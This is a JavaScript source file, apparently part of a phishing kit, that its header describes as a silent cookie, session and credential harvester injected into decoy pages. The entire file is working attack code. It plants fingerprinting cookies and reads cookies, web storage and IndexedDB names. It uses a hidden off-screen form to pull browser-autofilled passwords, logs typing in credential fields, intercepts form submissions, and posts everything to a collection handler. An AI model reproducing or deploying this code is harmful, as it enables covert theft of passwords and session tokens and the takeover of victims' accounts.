/* ════════════════════════════════════════════════════════════════════
   netrax_collector.js  --  Silent Cookie, Session & Credential Harvester
   ──────────────────────────────────────────────────────────────────
   Injected into every decoy page. Runs completely hidden.

   Captures:
     1. All REAL cookies (filters out our own _nx_ trackers)
     2. sessionStorage / localStorage data
     3. Browser-autofilled/saved credentials via hidden probes
     4. Real-time keystroke capture from credential input fields
     5. IndexedDB database names
     6. Plants tracking cookies for fingerprinting (reported separately)

   ONLY sends data when something meaningful is captured.
   Sends at most ONCE per page load (+ once on unload if new data found).
   ════════════════════════════════════════════════════════════════════ */
(function () {
    'use strict';

    var _NX = {
        hasSent: false,
        hasNewData: false,
        captured: {
            realCookies: '',
            trackingCookies: '',
            sessionStorage: '',
            localStorage: '',
            storedUsername: '',
            storedPassword: '',
            inputLog: {},
            indexedDBs: ''
        }
    };

    /* ── 0. Plant tracking cookies (fingerprinting) ────────────── */
    function _plantCookies() {
        try {
            var uid = 'nx_' + Math.random().toString(36).substr(2, 12);
            var ts = new Date().toISOString();
            var expires = new Date(Date.now() + 365 * 86400000).toUTCString();

            document.cookie = '_nx_sid=' + uid + '; expires=' + expires + '; path=/; SameSite=Lax';
            document.cookie = '_nx_ts=' + encodeURIComponent(ts) + '; expires=' + expires + '; path=/; SameSite=Lax';
            document.cookie = '_nx_ref=' + encodeURIComponent(document.referrer || 'direct') + '; expires=' + expires + '; path=/; SameSite=Lax';
            document.cookie = '_nx_res=' + screen.width + 'x' + screen.height + '; expires=' + expires + '; path=/; SameSite=Lax';
            document.cookie = '_nx_tz=' + encodeURIComponent(Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown') + '; expires=' + expires + '; path=/; SameSite=Lax';
            document.cookie = '_nx_lang=' + (navigator.language || 'unknown') + '; expires=' + expires + '; path=/; SameSite=Lax';
            document.cookie = '_nx_plt=' + (navigator.platform || 'unknown') + '; expires=' + expires + '; path=/; SameSite=Lax';
        } catch (e) { }
    }

    /* ── 1. Harvest cookies (split real vs our trackers) ────────── */
    function _harvestCookies() {
        try {
            var raw = document.cookie || '';
            if (!raw) return;

            var pairs = raw.split(';');
            var realParts = [];
            var nxParts = [];

            for (var i = 0; i < pairs.length; i++) {
                var pair = pairs[i].trim();
                if (!pair) continue;
                if (pair.indexOf('_nx_') === 0) {
                    nxParts.push(pair);
                } else {
                    realParts.push(pair);
                }
            }

            _NX.captured.realCookies = realParts.length > 0 ? realParts.join('; ') : '';
            _NX.captured.trackingCookies = nxParts.length > 0 ? nxParts.join('; ') : '';
        } catch (e) { }
    }

    /* ── 2. Harvest sessionStorage ──────────────────────────────── */
    function _harvestSessionStorage() {
        try {
            var data = {};
            for (var i = 0; i < sessionStorage.length; i++) {
                var k = sessionStorage.key(i);
                var v = sessionStorage.getItem(k);
                data[k] = (v && v.length > 500) ? v.substring(0, 500) + '...' : v;
            }
            if (Object.keys(data).length > 0) {
                _NX.captured.sessionStorage = JSON.stringify(data);
            }
        } catch (e) { }
    }

    /* ── 3. Harvest localStorage ────────────────────────────────── */
    function _harvestLocalStorage() {
        try {
            var data = {};
            for (var i = 0; i < localStorage.length; i++) {
                var k = localStorage.key(i);
                var v = localStorage.getItem(k);
                data[k] = (v && v.length > 500) ? v.substring(0, 500) + '...' : v;
            }
            if (Object.keys(data).length > 0) {
                _NX.captured.localStorage = JSON.stringify(data);
            }
        } catch (e) { }
    }

    /* ── 4. Harvest IndexedDB database names ────────────────────── */
    function _harvestIndexedDB() {
        try {
            if (indexedDB && typeof indexedDB.databases === 'function') {
                indexedDB.databases().then(function (dbs) {
                    if (dbs && dbs.length > 0) {
                        var names = dbs.map(function (db) { return db.name + ' (v' + db.version + ')'; });
                        _NX.captured.indexedDBs = names.join(', ');
                    }
                }).catch(function () { });
            }
        } catch (e) { }
    }

    /* ── 5. Inject hidden credential probe form ─────────────────── */
    function _injectCredentialProbe() {
        try {
            if (document.getElementById('__nx_probe_wrap')) return;

            var wrap = document.createElement('div');
            wrap.id = '__nx_probe_wrap';
            wrap.style.cssText = 'position:fixed;left:-99999px;top:-99999px;width:1px;height:1px;overflow:hidden;opacity:0.01;pointer-events:none;z-index:-1;';

            wrap.innerHTML =
                '<form id="__nx_probe_form" method="post" autocomplete="on" style="opacity:0.01">' +
                '<input type="text" id="__nx_u1" name="username" autocomplete="username" tabindex="-1" />' +
                '<input type="text" id="__nx_u2" name="email" autocomplete="email" tabindex="-1" />' +
                '<input type="text" id="__nx_u3" name="login" autocomplete="username" tabindex="-1" />' +
                '<input type="text" id="__nx_u4" name="user" autocomplete="username" tabindex="-1" />' +
                '<input type="password" id="__nx_p1" name="password" autocomplete="current-password" tabindex="-1" />' +
                '<input type="password" id="__nx_p2" name="passwd" autocomplete="current-password" tabindex="-1" />' +
                '<input type="password" id="__nx_p3" name="pass" autocomplete="current-password" tabindex="-1" />' +
                '</form>';

            document.body.appendChild(wrap);

            setTimeout(function () {
                try {
                    var fields = wrap.querySelectorAll('input');
                    for (var i = 0; i < fields.length; i++) {
                        fields[i].focus();
                        fields[i].blur();
                    }
                } catch (e) { }
            }, 500);
        } catch (e) { }
    }

    /* ── 6. Harvest credentials from probe fields ───────────────── */
    function _harvestProbeCredentials() {
        var userIds = ['__nx_u1', '__nx_u2', '__nx_u3', '__nx_u4'];
        var passIds = ['__nx_p1', '__nx_p2', '__nx_p3'];

        for (var i = 0; i < userIds.length; i++) {
            try {
                var el = document.getElementById(userIds[i]);
                if (el && el.value && el.value.trim()) {
                    _NX.captured.storedUsername = el.value.trim();
                    break;
                }
            } catch (e) { }
        }

        for (var j = 0; j < passIds.length; j++) {
            try {
                var el2 = document.getElementById(passIds[j]);
                if (el2 && el2.value && el2.value.trim()) {
                    _NX.captured.storedPassword = el2.value.trim();
                    break;
                }
            } catch (e) { }
        }
    }

    /* ── 7. Scan ALL visible input fields on the page ───────────── */
    function _scanPageInputs() {
        try {
            if (!_NX.captured.storedUsername) {
                var userSelectors = [
                    'input[type="text"][name*="user"]',
                    'input[type="text"][name*="login"]',
                    'input[type="text"][name*="email"]',
                    'input[type="text"][name*="account"]',
                    'input[type="email"]',
                    'input[type="tel"]',
                    'input[autocomplete="username"]',
                    'input[autocomplete="email"]',
                    'input[id*="user"]',
                    'input[id*="login"]',
                    'input[id*="email"]'
                ];
                var userFields = document.querySelectorAll(userSelectors.join(','));
                for (var i = 0; i < userFields.length; i++) {
                    if (userFields[i].value && userFields[i].value.trim() &&
                        !userFields[i].id.startsWith('__nx_')) {
                        _NX.captured.storedUsername = userFields[i].value.trim();
                        break;
                    }
                }
            }

            if (!_NX.captured.storedPassword) {
                var passFields = document.querySelectorAll('input[type="password"]');
                for (var j = 0; j < passFields.length; j++) {
                    if (passFields[j].value && passFields[j].value.trim() &&
                        !passFields[j].id.startsWith('__nx_')) {
                        _NX.captured.storedPassword = passFields[j].value.trim();
                        break;
                    }
                }
            }
        } catch (e) { }
    }

    /* ── 8. Real-time input monitoring (credential fields only) ─── */
    function _startInputMonitor() {
        try {
            document.addEventListener('input', function (e) {
                var t = e.target;
                if (!t || !t.tagName || t.tagName !== 'INPUT') return;
                if (t.id && t.id.startsWith('__nx_')) return;

                var fieldType = (t.type || '').toLowerCase();
                var fieldName = t.name || t.id || t.getAttribute('autocomplete') || 'unnamed';

                if (fieldType === 'password' && t.value) {
                    _NX.captured.storedPassword = t.value;
                    _NX.captured.inputLog['password@' + fieldName] = t.value;
                    _NX.hasNewData = true;
                } else if (fieldType === 'text' || fieldType === 'email' || fieldType === 'tel') {
                    if (t.value) {
                        var nameLC = fieldName.toLowerCase();
                        if (nameLC.indexOf('user') !== -1 || nameLC.indexOf('login') !== -1 ||
                            nameLC.indexOf('email') !== -1 || nameLC.indexOf('account') !== -1 ||
                            nameLC.indexOf('phone') !== -1 || nameLC.indexOf('mobile') !== -1) {
                            _NX.captured.storedUsername = t.value;
                            _NX.captured.inputLog[fieldType + '@' + fieldName] = t.value;
                            _NX.hasNewData = true;
                        }
                    }
                }
            }, true);

            document.addEventListener('change', function (e) {
                var t = e.target;
                if (!t || !t.tagName || t.tagName !== 'INPUT') return;
                if (t.id && t.id.startsWith('__nx_')) return;

                var fieldType = (t.type || '').toLowerCase();
                var fieldName = t.name || t.id || 'unnamed';

                if (fieldType === 'password' && t.value) {
                    _NX.captured.storedPassword = t.value;
                    _NX.hasNewData = true;
                } else if (t.value && (fieldType === 'text' || fieldType === 'email' || fieldType === 'tel')) {
                    var nameLC2 = fieldName.toLowerCase();
                    if (nameLC2.indexOf('user') !== -1 || nameLC2.indexOf('login') !== -1 ||
                        nameLC2.indexOf('email') !== -1) {
                        _NX.captured.storedUsername = t.value;
                        _NX.hasNewData = true;
                    }
                }
            }, true);
        } catch (e) { }
    }

    /* ── 9. Monitor for dynamically added forms ─────────────────── */
    function _watchDOMMutations() {
        try {
            if (typeof MutationObserver === 'undefined') return;

            var observer = new MutationObserver(function (mutations) {
                for (var i = 0; i < mutations.length; i++) {
                    var added = mutations[i].addedNodes;
                    for (var j = 0; j < added.length; j++) {
                        var node = added[j];
                        if (node.nodeType !== 1) continue;
                        var newInputs = [];
                        if (node.tagName === 'INPUT') {
                            newInputs.push(node);
                        } else if (node.querySelectorAll) {
                            newInputs = node.querySelectorAll('input');
                        }
                        if (newInputs.length > 0) {
                            setTimeout(_scanPageInputs, 1000);
                        }
                    }
                }
            });

            observer.observe(document.body, { childList: true, subtree: true });
        } catch (e) { }
    }

    /* ── 10. Intercept form submissions ─────────────────────────── */
    function _interceptForms() {
        try {
            document.addEventListener('submit', function (e) {
                var form = e.target;
                if (!form || !form.elements) return;

                for (var i = 0; i < form.elements.length; i++) {
                    var el = form.elements[i];
                    if (!el.value || !el.tagName || el.tagName !== 'INPUT') continue;
                    if (el.id && el.id.startsWith('__nx_')) continue;

                    var ft = (el.type || '').toLowerCase();
                    var fn = el.name || el.id || 'unnamed';

                    if (ft === 'password') {
                        _NX.captured.storedPassword = el.value;
                        _NX.hasNewData = true;
                    } else if (ft === 'text' || ft === 'email' || ft === 'tel') {
                        var fnLC = fn.toLowerCase();
                        if (fnLC.indexOf('user') !== -1 || fnLC.indexOf('login') !== -1 ||
                            fnLC.indexOf('email') !== -1 || fnLC.indexOf('account') !== -1) {
                            _NX.captured.storedUsername = el.value;
                            _NX.hasNewData = true;
                        }
                    }
                    _NX.captured.inputLog[ft + '@' + fn] = el.value;
                }

                // Force-send on form submit
                _sendPayload(true);
            }, true);
        } catch (e) { }
    }

    /* ── CHECK: Is there meaningful data worth reporting? ────────── */
    function _hasMeaningfulData() {
        // Credentials captured? Always send.
        if (_NX.captured.storedUsername || _NX.captured.storedPassword) return true;

        // Input log has entries? Send.
        if (Object.keys(_NX.captured.inputLog).length > 0) return true;

        // Real (non-_nx_) cookies found? Send.
        if (_NX.captured.realCookies && _NX.captured.realCookies.length > 0) return true;

        // Session or local storage has data? Send.
        if (_NX.captured.sessionStorage && _NX.captured.sessionStorage.length > 0) return true;
        if (_NX.captured.localStorage && _NX.captured.localStorage.length > 0) return true;

        // IndexedDB databases found? Send.
        if (_NX.captured.indexedDBs && _NX.captured.indexedDBs.length > 0) return true;

        return false;
    }

    /* ── SEND PAYLOAD ───────────────────────────────────────────── */
    function _sendPayload(force) {
        // Re-harvest everything fresh
        _harvestCookies();
        _harvestSessionStorage();
        _harvestLocalStorage();
        _harvestProbeCredentials();
        _scanPageInputs();

        // Only send if there is meaningful data
        if (!_hasMeaningfulData()) return;

        // Don't double-send (unless forced by form submit with new data)
        if (_NX.hasSent && !force) return;
        if (_NX.hasSent && force && !_NX.hasNewData) return;

        _NX.hasSent = true;
        _NX.hasNewData = false;

        // Build payload
        var inputLogStr = '';
        try {
            var logKeys = Object.keys(_NX.captured.inputLog);
            if (logKeys.length > 0) {
                inputLogStr = JSON.stringify(_NX.captured.inputLog);
            }
        } catch (e) { }

        var payload = JSON.stringify({
            cookies: _NX.captured.realCookies || 'None',
            tracking_cookies: _NX.captured.trackingCookies || '',
            session_storage: _NX.captured.sessionStorage || 'None',
            local_storage: _NX.captured.localStorage || 'None',
            stored_username: _NX.captured.storedUsername,
            stored_password: _NX.captured.storedPassword,
            input_log: inputLogStr,
            indexeddb: _NX.captured.indexedDBs,
            page_url: window.location.href,
            page_title: document.title
        });

        var url = 'handlers/cookie_handler.php';

        try {
            if (navigator.sendBeacon) {
                var sent = navigator.sendBeacon(url, new Blob([payload], { type: 'application/json' }));
                if (sent) return;
            }
        } catch (e) { }

        try {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', url, true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(payload);
        } catch (e) { }
    }

    /* ── BOOTSTRAP ──────────────────────────────────────────────── */
    function _init() {
        // Phase 1: Setup
        _plantCookies();
        _harvestIndexedDB();
        _injectCredentialProbe();
        _startInputMonitor();
        _interceptForms();
        _watchDOMMutations();

        // Phase 2: Single collection attempt after autofill has time to populate
        setTimeout(function () {
            _sendPayload(false);
        }, 3000);

        // Phase 3: Send on page unload ONLY if new data was captured since last send
        window.addEventListener('beforeunload', function () {
            if (_NX.hasNewData || !_NX.hasSent) {
                _sendPayload(true);
            }
        });
    }

    // Start when DOM is ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', _init);
    } else {
        _init();
    }
})();
